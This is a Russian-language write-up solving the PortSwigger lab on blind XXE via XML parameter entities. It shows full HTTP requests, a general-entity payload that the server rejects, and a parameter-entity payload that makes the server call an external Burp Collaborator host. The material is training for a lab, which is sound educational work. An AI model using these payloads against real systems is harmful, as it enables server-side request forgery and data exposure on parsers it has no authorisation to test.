---
title: "Blind XXE with out-of-band interaction via XML parameter entities"
date: 2025-12-18
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities"
classes: wide
---	

Для прохождения нужно отправить `DNS`-запрос? эксплуатируя уязвимость Blind XXE.

```
https://0ab1006604ea7b1e800f443c00660089.web-security-academy.net/
```

# Solution

Я написал достаточно много райтапов на `Port Swigger`, и, возможно, не всем понятно, зачем я добавляю ссылку на поднятую лабу. Так вот, это для моего удобства, чтобы поставить фильтр в `Burp` на запросы, которые содержат данный домен и поддомен)

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_xxe/IMG_xxe-with-out-of-band-interaction-using-parameter-entities/1.png){: height="200" .align-center}

Иначе это выглядит вот так:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_xxe/IMG_xxe-with-out-of-band-interaction-using-parameter-entities/2.jpg){: height="200" .align-center}

Вернемся к лабе. Похоже на то, что `XXE` опять в `Check Stock`, поэтому перейду туда. Вот запрос:

```http
POST /product/stock HTTP/2
Host: 0ab1006604ea7b1e800f443c00660089.web-security-academy.net
Cookie: session=RLNCYmowyVXL6CM6X4t5Jj7CPuTNBMhl
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:146.0) Gecko/20100101 Firefox/146.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ab1006604ea7b1e800f443c00660089.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 107
Origin: https://0ab1006604ea7b1e800f443c00660089.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck>
		<productId>
			1
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

Попробую отправить запрос на `Burp Collaborator`. Вот сгенерированная ссылка:

```
7owf9flscilj765mfu9bfkre85ex2nqc.oastify.com
```

Соберу `XML`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE payload [ <!ENTITY xxe SYSTEM "http://7owf9flscilj765mfu9bfkre85ex2nqc.oastify.com"> ]>
	<stockCheck>
		<productId>
			1
		</productId>
		<storeId>
			&xxe;
		</storeId>
	</stockCheck>
```

Добавлю в запрос и отправлю:

```http
POST /product/stock HTTP/2
Host: 0ab1006604ea7b1e800f443c00660089.web-security-academy.net
Cookie: session=RLNCYmowyVXL6CM6X4t5Jj7CPuTNBMhl
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:146.0) Gecko/20100101 Firefox/146.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ab1006604ea7b1e800f443c00660089.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 107
Origin: https://0ab1006604ea7b1e800f443c00660089.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE payload [ <!ENTITY xxe SYSTEM "http://7owf9flscilj765mfu9bfkre85ex2nqc.oastify.com"> ]>
	<stockCheck>
		<productId>
			1
		</productId>
		<storeId>
			&xxe;
		</storeId>
	</stockCheck>
```

Любопытно:

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 47

"Entities are not allowed for security reasons"
```

Попробую другой подход:

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE payload [ <!ENTITY % xxe SYSTEM "http://97ehsh4uvk4lq8ooywsdymagr7xzlq9f.oastify.com"> %xxe; ]>
	<stockCheck>
		<productId>
			1
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

Тут я определил параметрическую сущность, которая ссылается на `Burp Collaborator`:

```xml
<!ENTITY % xxe SYSTEM "http://97ehsh4uvk4lq8ooywsdymagr7xzlq9f.oastify.com">
```

Затем эта сущность вызывается с помощью `%xxe;`, что позволяет обойти ограниечение. Вот итоговый запрос:

```http
POST /product/stock HTTP/2
Host: 0ab1006604ea7b1e800f443c00660089.web-security-academy.net
Cookie: session=RLNCYmowyVXL6CM6X4t5Jj7CPuTNBMhl
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:146.0) Gecko/20100101 Firefox/146.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ab1006604ea7b1e800f443c00660089.web-security-academy.net/product?productId=1
Content-Type: application/xml
Content-Length: 247
Origin: https://0ab1006604ea7b1e800f443c00660089.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE payload [ <!ENTITY % xxe SYSTEM "http://97ehsh4uvk4lq8ooywsdymagr7xzlq9f.oastify.com"> %xxe; ]>
	<stockCheck>
		<productId>
			1
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

Сработало:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_xxe/IMG_xxe-with-out-of-band-interaction-using-parameter-entities/3.png){: height="200" .align-center}

Лаба решена)

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_xxe/IMG_xxe-with-out-of-band-interaction-using-parameter-entities/4.png){: height="200" .align-center}